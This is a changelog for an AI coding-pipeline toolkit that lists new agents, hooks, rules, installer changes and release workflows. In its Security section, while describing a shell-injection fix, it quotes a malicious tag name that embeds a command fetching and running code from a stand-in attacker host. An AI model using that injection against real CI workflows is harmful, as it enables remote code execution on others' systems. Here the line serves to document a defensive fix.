# Changelog

All notable user-facing changes to claude-code-sdlc are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

User-facing means changes a developer using the SDLC pipeline notices in
their day-to-day work — new commands, new agents, new gates, behavioral
changes to existing pipeline stages, install.sh changes, fixes to broken
flows. Internal refactors, type-only changes, test-infrastructure tweaks,
and documentation cleanups do NOT belong here (per
`templates/rules/changelog.md`).

## [Unreleased]

### Added

- **Git workflow rule: never `git rebase`.** `src/rules/git.md` gains a hard prohibition on `git rebase` (interactive or otherwise). Rationale: rebase rewrites history — it drops commits, forces pushes, and strands work when a conflict aborts mid-rebase; the agent's environment also blocks the interactive `-i` flag outright. The rule directs the agent to `git merge` for branch integration, `git revert` / `git reset`-on-unpushed for undo, and to escalate to the operator if history genuinely needs rewriting.

- **`PostToolUse[ExitPlanMode]` hook — plan-persistence reminder.** New `sdlc-exitplanmode-reminder.sh` / `.ps1` hook deployed by `install.sh` / `install.ps1` and wired into `~/.claude/settings.json` under `hooks.PostToolUse[matcher=ExitPlanMode]`. Fires AFTER any `ExitPlanMode` tool call and inspects `<project>/.claude/plan.md`: state=`ok` (file exists, non-empty, mtime ≤ 300s) is silent on the happy path; states `missing` / `empty` / `stale` (mtime > 300s) emit an operator-visible `systemMessage` bubble plus an agent-only `additionalContext` reminder wrapped in `<hook source="sdlc-exitplanmode-reminder" ...>` tag. Soft enforcement layer for the CLAUDE.md `## Plan-Mode Persistence` mandate — never blocks (exit 0 always). The previous behavior was that a sloppy agent could call ExitPlanMode without first Write'ing `plan.md`, silently breaking `/bootstrap-feature` Step 0 later in the pipeline; the hook surfaces the omission immediately so the agent re-persists the plan body in the very next response.

- **Auto-firing session-orientation via Claude Code hooks.** Replaces the prior `/onboarding` slash command (which required manual invocation and was easy to forget) with two `~/.claude/hooks/` scripts deployed by `install.sh` / `install.ps1` and wired into `~/.claude/settings.json`:
  - **SessionStart hook** (`sdlc-onboarding.sh` / `.ps1`) — fires on `startup | resume | compact`. Auto-injects orientation context as `additionalContext`: names the three cognitive-self-check protocols (Facts / Decisions / Inbound), lists loaded pipeline rules with mtimes, summarises the project scratchpad (Feature / Branch / Status / Blockers), tails the per-session changelog, and reports git state. The orchestrator starts every session already oriented — no slash command to remember.
  - **SubagentStart hook** (`sdlc-subagent-onboarding.sh` / `.ps1`) — fires before every `Agent`-tool spawn. Auto-injects the 5-point subagent onboarding preamble (Protocols 1/2/3, knowledge-base discipline, insights-corpus query, tool-limitations, push-back-is-not-failure reminder). Belt-and-suspenders with the parent-side `subagent-onboarding.md` rule: the hook guarantees the dispatched sub-agent receives the contract even when the parent's spawn prompt omits the preamble, while the rule remains MANDATORY so feature-specific context (current `$FEATURE_SLUG`, fix directives, upstream `## Decisions` references) is still propagated explicitly in the prompt for transcript auditability.

  All three hooks are idempotent on re-install — the `settings.json` merge logic (jq on bash, ConvertFrom-Json on PowerShell) deduplicates by exact command-string equality, so re-running the installer never produces duplicate hook entries. Stale `commands/onboarding.md` from prior installs is removed automatically. See `src/hooks/`.

- **New `session-changelog` rule + per-project `<project>/.claude/changelog.md` convention.** A short-bullet operator-facing log the orchestrator maintains across sessions for the project manager. Distinct from the formal product `CHANGELOG.md` (end-user-facing, governed by `templates/rules/changelog.md`) and from `.claude/scratchpad.md` (rich internal state). One bullet per meaningful milestone — commit landed, plan accepted, wave/slice complete, blocker surfaced/resolved, merge-ready verdict, release cut. Hard cap 100 chars per bullet, dated `## YYYY-MM-DD` sections newest-on-top. Sentinel-activated: presence of `~/.claude/rules/session-changelog.md` enables the behaviour; absence equals opt-out. See `src/rules/session-changelog.md`.

### Changed

- **claudebase split into a standalone repo with its own installer.** Previously, the `claude-code-sdlc` installer downloaded the claudebase binary, registered the alias, installed pdfium, pre-warmed the e5 encoder, AND deployed the knowledge-base + insights-related prompts/rules into `~/.claude/`. All of that logic now lives in the new [`claudebase`](https://github.com/codefather-labs/claudebase) repo's own `install.sh` / `install.ps1`. The SDLC installer chains to claudebase via `curl ... | bash` (Linux/macOS) or `Invoke-WebRequest ... | iex` (Windows). The previously-bundled files (`rules/knowledge-base.md`, `rules/knowledge-base-tool.md`, `rules/tool-limitations.md`, `commands/knowledge-ingest.md`, `commands/reflect.md`, `commands/consolidate.md`, `agents/reflection.md`, `agents/consolidator.md`) now ship from claudebase. End-user experience is byte-identical — all 22 agents and 10 commands still deploy to `~/.claude/` — the change is just about WHICH installer is the source of truth. claudebase can now also be installed standalone (without SDLC) for projects that only want the memory + observation infrastructure. SDLC bumps to v3.1.0.

### Added

- **New `corporate-code-style-reviewer` agent + `/merge-ready` integration.** A new agent (`Norm`, the corporate code-style reviewer) audits recent code changes against a project's corporate code-style rules. Sentinel-gated: only activates when `<project>/.codestyle` exists and is non-empty — projects without `.codestyle` see byte-identical behavior. When the sentinel is present, the agent runs as a pre-gate iteration loop before `/merge-ready` Gate 0, with the same PASS / FAIL / BLOCKED semantics as `qa-engineer` / `/qa-cycle`: FAIL spawns the implementer with `.codestyle §N` + `file:line` citations as fix directives; PASS proceeds to Gate 0; BLOCKED halts and surfaces a fact-grounded `exit_argument` via `AskUserQuestion`. After 3 consecutive non-converging iterations the reviewer itself emits BLOCKED. Designed for corporate environments where each team has their own code-style document; SDLC ships the agent ready-to-use, the team owns the `.codestyle` rules content.
- **New `subagent-onboarding` rule (`~/.claude/rules/subagent-onboarding.md`).** Mandatory rule that every `Agent` tool invocation include an onboarding preamble pointing the sub-agent at the cognitive-self-check protocols (Facts / Decisions / Inbound), the knowledge-base discipline, and the insights-corpus retrieval. Catches the named failure mode where a parent agent's discipline is local-only and doesn't propagate to spawned children — sub-agents that operate without these protocols produce fact-shaped lies, decision-shaped hacks, and re-discover insights prior sessions already captured. The rule pins a verbatim onboarding-block template that goes ABOVE the actual task description in every spawn prompt.

- **Seven neuroscience-inspired protocols wired into the pipeline.** Three new agents and two new slash commands extend the SDLC pipeline with explicit analogues of how the human brain prevents focused-execution failure modes. (1) **Anterior cingulate cortex — post-error slowing.** After any `/qa-cycle` FAIL iteration, the implementer is re-spawned in **deliberate mode**: smaller diff target (≤50% of prior iteration), mandatory pre-flight typecheck, mandatory re-read before edit, no adjacent refactors, no new abstractions. Wired into `/qa-cycle` Step 3 and documented in `error-recovery.md`. (2) **Orbitofrontal cortex — sunk-cost detection.** A **sunk-cost circuit breaker** monitors implementer iteration diff-progression: 3 consecutive iterations touching the same files with diff sizes within ±20% trigger a pause and `AskUserQuestion` (continue / pivot / abort). Wired into `/qa-cycle` Step 3. (3) **Hippocampal sleep-replay — memory consolidation.** New `consolidator` agent and `/consolidate` slash command run 6 cross-artifact drift-detection passes (PRD↔plan / use-case↔test↔impl / decision drift across slices / hack accumulation / verdict↔reality / pattern observations). Auto-chained between waves in `/develop-feature` Phase 2; manually invokable. (4) **Confirmation-bias debiasing — devil's advocate.** New `red-team` agent argues AGAINST the plan with 6 attack vectors (premise / approach / scope / dependency / failure-mode / maintenance). Auto-chained from `/bootstrap-feature` Step 5.25 after the planner emits the plan, and from `/develop-feature` Phase 1.5 before implementation. CRITICAL/MAJOR objections force the planner to revise the plan OR document an explicit defense in `## Review Notes`. (5) **Predictive coding (Friston) — prediction error.** The planner's slice format gains a new `Predicted outcome:` field; the `verifier` agent gains a new **Level 3.5 Prediction-Error** check that compares predicted-vs-actual end-state per slice and surfaces deltas (small / moderate / large). Large deltas FAIL the slice and recommend replan or re-implement. (6) **Anterior insula salience network.** Every `## Facts` and `## Decisions` entry now carries a `salience: high | medium | low` tag so downstream reviewers (consolidator especially) can sort by attention-priority instead of treating every entry as equal. (7) **Default Mode Network — unfocused observation.** New `reflection` agent and `/reflect` slash command — no specific task; the agent reads project state and surfaces non-obvious observations (unused exports, duplicated implementations, dead code, PRD-requirements-without-slices). Exclusively user-invoked; never auto-chained. Adds 3 agents (red-team, consolidator, reflection — total now 21) and 2 commands (`/consolidate`, `/reflect` — total now 10). All neuroscience integration points are documented in the new "Neuroscience-Inspired Pipeline Protocols" master section in `CLAUDE.md`.
- The Cognitive Self-Check rule (`~/.claude/rules/cognitive-self-check.md`) is upgraded from a single fact-vs-assumption protocol to **three complementary protocols** that every in-scope thinking agent runs on every output. Protocol 1 (Fact-vs-Assumption Self-Check, 4 questions about evidence) is unchanged. NEW: Protocol 2 — Decision-Quality Self-Check (5 questions: hack-check / sanity-check / alternative-evaluation / symptom-vs-cause / root-cause-tracked) emits a mandatory `## Decisions` block immediately after the existing `## Facts` block. NEW: Protocol 3 — Inbound Task Validation (4 questions on receipt: is the task nonsensical / is the upstream decision an error / what's the justification / would executing this amplify an upstream error) emits push-back under a `### Inbound validation` subsection. Push-back is now an explicit, encouraged signal — silent execution of nonsensical or upstream-broken tasks is the named failure mode this protocol prevents. The rule file closes with an ultra-short three-question TL;DR in Russian for daily recall. All 13 in-scope agent prompts updated to reference the three-protocol framework; the main `CLAUDE.md` workflow doc has a new prominent "Cognitive Protocols — MANDATORY" section right after the Agency Roles table that explains why each protocol exists and what failure mode it catches. Plan Critic enforcement extended: missing `## Decisions` block on a current-cycle file-based artifact that contains decisions = MAJOR; inline decision in body but absent from the structured block = MAJOR; inline hack acknowledged in prose without a removal path = MAJOR; silent contradiction-resolution between upstream sources = MAJOR. Same MERGE_DATE backward-compat window as the original `## Facts` discipline — pre-existing artifacts are exempt.
- New `qa-engineer` agent and `/qa-cycle` slash command. After implementation completes, `/qa-cycle` spawns `qa-engineer` to execute the documented QA plan against the running implementation — Playwright MCP for UI/UX (navigate / snapshot / click / take_screenshot / console_messages / network_requests + visual examination of screenshots for layout / overflow / z-index / color defects), Bash for API / DB / CLI / file-system checks. The agent emits a per-test-case PASS / FAIL / BLOCKED verdict with concrete evidence (every PASS cites a tool invocation; every FAIL cites expected-vs-actual mismatch + fix directive). FAIL spawns the implementer with directives — the cycle repeats. BLOCKED halts and surfaces a fact-grounded `exit_argument` + `human_needs_to` directive via `AskUserQuestion`. No iteration cap — exit only via PASS, BLOCKED, or implementer FAIL. Run before `/merge-ready`; `/develop-feature` chains it automatically as Phase 2.75. `qa-planner` updated to require an `Evidence Required` column on every test case and a `Verification Class` (UI/UX | API | DB | CLI | FS | Mixed); the strict-evidence-execution pass catches visual / UX defects that automated E2E typically misses. Adds the 18th agent (`qa-engineer`) and 8th slash command (`/qa-cycle`).

### Changed

- Knowledge-base CLI extracted to a standalone repository at [github.com/codefather-labs/claudebase](https://github.com/codefather-labs/claudebase). Tool renamed from `claudeknows` to `claudebase`; install path moved from `~/.claude/tools/sdlc-knowledge/` to `~/.claude/tools/claudebase/`. Existing installations are auto-migrated by `install.sh` on next run — the old directory and the legacy `claudeknows` symlink are removed automatically. The binary is still downloaded from GitHub releases as before, just from the new repo's release pipeline. Version continuity preserved: the last `sdlc-knowledge-v0.4.0` release (published 2026-05-10) is succeeded by `claudebase-v0.4.0` with no version regression.

## [0.4.0] - 2026-05-10

### Added

- Native Windows installer — `install.bat` (cmd.exe wrapper) and `install.ps1` (PowerShell) install the SDLC config to `%USERPROFILE%\.claude\`, download `sdlc-knowledge.exe` and `pdfium.dll` from GitHub releases, register a `claudeknows.cmd` wrapper, and add it to your User PATH. No Git Bash / MSYS2 / Cygwin required.
- The knowledge-base search tool now understands your queries semantically — matching concepts and cross-lingual paraphrases rather than exact keywords — and can also find text embedded in figures and diagrams extracted from PDFs.
- New `claudeknows page <doc> <N>` subcommand returns the raw text of a specific page of an indexed book (with optional `--range r` for a `[N-r..N+r]` neighborhood) so the LLM can navigate source material by printed page number when chunk-level context is insufficient. Pages populate automatically on fresh ingest; existing indexes backfill via `claudeknows reindex-pages`.
- New `claudeknows compare <query>` subcommand runs the same query through `lexical`, `dense`, and `hybrid` retrieval modes side-by-side so you can see which mode finds your content best on your own corpus.
- New `claudeknows search --context N` flag expands each hit with ±N neighbor chunks (~one page when N=2) for paragraph-level reading context.

## [0.3.1] - 2026-05-02

### Added

- Plan-mode plans are now automatically saved to `<project>/.claude/plan.md` so they are available to the pipeline without any manual copy-paste step. `/bootstrap-feature` Step 0 verifies the file exists and is non-empty before invoking any agent.

### Fixed

- `claudeknows ingest` on Windows no longer fails with "HOME env var unset" when ingesting PDFs — the binary now falls back to `USERPROFILE` for home-directory resolution on Windows.

## [0.3.0] - 2026-04-30

### Added

- **`/release` slash command** — release packaging extracted from
  `/merge-ready` Gate 9 to a standalone user-invoked command. Run
  `/release` when ready to cut a versioned release; `/merge-ready`
  is now strictly about quality gates.
- **`/bootstrap-feature --with-resources` flag** — force-runs the
  resource-architect step regardless of keyword auto-detection
  outcome.
- **Tier-based agent models** for token-cost optimization. Default
  matrix: opus (architect, security-auditor, code-reviewer, verifier,
  release-engineer, resource-architect, role-planner) / sonnet
  (prd-writer, ba-analyst, planner, refactor-cleaner) / haiku
  (qa-planner, test-writer, build-runner, e2e-runner, doc-updater,
  changelog-writer). README §Customization documents the rationale
  and per-agent override.

### Changed

- **`/merge-ready` is now 9 quality gates** (was 10). Release
  packaging extracted to the standalone `/release` command. Gate
  numbering 0 through 8 unchanged; Step 11 (post-merge on-demand
  role teardown) now runs after Gate 8 instead of after Gate 9.
- **Step 3.5 of `/bootstrap-feature` is now CONDITIONAL.** The
  resource-architect agent runs only when the PRD/use-cases body
  contains external-resource trigger keywords (third-party,
  external API, MCP, OAuth, vendor, compliance, S3, Stripe, etc.)
  OR the user explicitly passes `--with-resources`. When neither
  triggers, Step 3.5 is silently skipped, saving one agent call
  per bootstrap on the common case. Step 3.75 (role-planner)
  remains MANDATORY.
- **`claudeknows search --context <N>`** flag added in iter-3.x —
  expands each hit with ±N neighbor chunks for paragraph-level
  context. Default N=0 (backward-compat — no expansion).

## [0.2.0] - 2026-04-26

### Added

- **Auto-release executing mode** (opt-in via `.claude/rules/auto-release.md`).
  When the sentinel file is present, `release-engineer` Gate 9 transitions
  from suggest-only to executing mode after Steps 0–6 produce the structured
  summary. Gate 9 then creates and pushes the release tag itself with a
  4-tier authority dispatch — Trivial (`git add`, `commit`, `merge-base`,
  `diff`, `ls-remote`) auto-execute silently; Moderate (`git tag -a`)
  auto-execute with audit; Sensitive (`git push origin <tag>`) prompt
  default-deny `[y/N]` with `AUTO_RELEASE=1` env var or non-TTY stdin
  auto-confirm; Forbidden (`npm publish`, `cargo publish`, `pypi upload`,
  `gh release create`, any `--force`) refused unconditionally. Anchored-
  regex bash whitelist with metacharacter pre-rejection. Sentinel-absent
  behavior is byte-identical to suggest-only mode.
- **Tag-scheme disambiguation** in Gate 9. Releases that touch
  `tools/sdlc-knowledge/` get the `sdlc-knowledge-v<X.Y.Z>` tag scheme
  (triggers the binary release pipeline); pure SDLC core releases get
  the bare `v<X.Y.Z>` scheme (triggers the new core release pipeline);
  both-changed releases prompt for explicit user choice (auto-aborts in
  headless mode).
- **Windows-x64 prebuilt binary** for `sdlc-knowledge`. The release matrix
  now produces a Windows binary alongside darwin-arm64, darwin-x64,
  linux-x64, and linux-arm64. `install.sh` detects MINGW/MSYS/CYGWIN
  shell environments and downloads the Windows binary (with `.exe`
  suffix) instead of attempting a cargo source build. (Note: Windows
  binary build is matrix-defined but pdf.rs unix-only imports may
  prevent compilation — gated behind `cfg(unix)` in iter-3.1.)
- **SDLC core release pipeline** (`.github/workflows/sdlc-core-release.yml`).
  Bare `v*.*.*` tag pushes now produce a GitHub Release with source
  tarball + release-notes body (consumed from `.claude/release-notes-X.Y.Z.md`)
  via `softprops/action-gh-release@v2`. Disjoint from the existing
  `sdlc-knowledge-v*` pipeline.
- **Source tarball generation** for both release pipelines. `git archive`
  honors the new `.gitattributes` `export-ignore` entries so internal
  artifacts (`.claude/` agent state, `docs/qa/`, `docs/use-cases/`,
  `books/` corpus) are stripped from published source distributions.
  Defense-in-depth `tar -tzf | grep` step in the core pipeline fails the
  job if any excluded path leaks into the archive.
- **Pre-push hook template** (`templates/hooks/pre-push`). Optional
  advisory hook for opted-in projects that warns to stderr when
  `CHANGELOG.md [Unreleased]` is non-empty at push time, suggesting
  `/merge-ready` Gate 9 should run first. Never blocks the push.
  Honors `GIT_HOOKS_BYPASS=1` for one-shot bypass.
- **SDLC core opts in to its own pipeline.** Adds
  `.claude/rules/auto-release.md` (Gate 9 executing-mode sentinel) and
  `.claude/rules/changelog.md` (changelog-writer activation) at the
  repo root. The previous `no-op: not configured` outcome from
  `changelog-writer` lifecycle hooks is now active — the SDLC repo
  dogfoods its own automated changelog and release packaging.

### Changed

- **install.sh major version bump 2.1.0 → 3.0.0.** Reflects the new
  executing-mode option in `release-engineer` Gate 9: opted-in projects
  see Gate 9 run whitelisted git commands itself instead of just
  emitting a fenced `Commands to run` block. Suggest-only remains the
  default; projects without `<project>/.claude/rules/auto-release.md`
  see byte-identical v2.x behavior.
- **`sdlc-knowledge` release pipeline** matches Windows pdfium archives
  via grouped find alternation. The library is named `pdfium.dll`
  on Windows (no `lib` prefix per Windows convention); the workflow
  now copies it alongside the macOS/Linux `libpdfium.{dylib,so}` form.
- **Migration guide** at `MIGRATION.md` walks v2.x users through the
  upgrade, opt-in path, opt-out path, and known issues.

### Fixed

- **`install.sh` REPO_URL** corrected from `github.com/Koroqe/claude-code-sdlc.git`
  to `github.com/codefather-labs/claude-code-sdlc.git`. The v2.x typo
  broke `curl -fsSL https://raw.githubusercontent.com/codefather-labs/claude-code-sdlc/main/install.sh | bash`
  one-line install against the actual canonical remote. The corrected
  URL also propagates to the script's quick-install help text and
  inline comments.

### Security

- **install.sh download hardening parity.** The `install_knowledge_binary`
  function's curl invocation gains `--max-redirs 5 --max-time 120` and
  the wget fallback gains `--max-redirect=5 --timeout=120 --secure-protocol=TLSv1_2`
  to match the pdfium-download path's defense-in-depth. Mitigates
  redirect-loop denial-of-service and infinite-stall scenarios on
  attacker-controlled or dead URLs (Slice 2 security pre-review MEDIUM).
- **Workflow shell-injection prevention** in `sdlc-core-release.yml`.
  All `${{ github.ref_name }}` and `${{ github.event.* }}` references
  are mediated through `env:` blocks before being consumed by `run:`
  shell commands; never directly interpolated. Mitigates the named
  exploit class where a malicious tag name embeds shell substitution
  (e.g., `v1.0.0$(curl evil.com|sh)`) and executes during the workflow
  run (Slice 4 security pre-review HIGH M5c + A1).
